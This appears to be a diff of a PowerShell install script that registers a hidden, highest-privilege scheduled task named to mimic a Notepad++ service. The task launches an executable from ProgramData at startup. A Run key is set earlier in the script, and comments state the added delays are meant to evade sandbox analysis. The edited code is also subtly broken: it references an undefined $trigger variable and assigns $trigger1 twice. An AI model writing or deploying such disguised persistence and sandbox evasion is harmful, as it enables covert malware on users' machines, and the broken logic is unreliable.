@@ -70,18 +70,19 @@ try{
 } catch {
     Log-Msg "Failed to set Run key: $_"
 }
-
+$trigger1 = New-ScheduledTaskTrigger -AtStartup
 # 3. FIX: Simplified Task Action to call Executable directly
 # The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
 $action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe" -WorkingDirectory "C:\ProgramData\npp"
-# $trigger = New-ScheduledTaskTrigger -AtStartup
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) # Initial delay to ensure system stability
+# 4. FIX: Simplified Triggers and added Delay to evade sandbox analysis
+$trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) # Initial delay to ensure system stability
+$trigger2 = New-ScheduledTaskTrigger -AtStartup
 $trigger.Delay = "PT30S" # Delay execution by 30 seconds after startup to evade sandbox analysis
 $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RunOnlyIfNetworkAvailable
 
 # Register (Force update if exists)
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+$task = New-ScheduledTask -Action $action -Trigger @($trigger1, $trigger2) -Principal $principal -Settings $settings
 Register-ScheduledTask -TaskName "NotepaddPlusPlusService" -InputObject $task -Force | Out-Null
 
 # # Start the task immediately
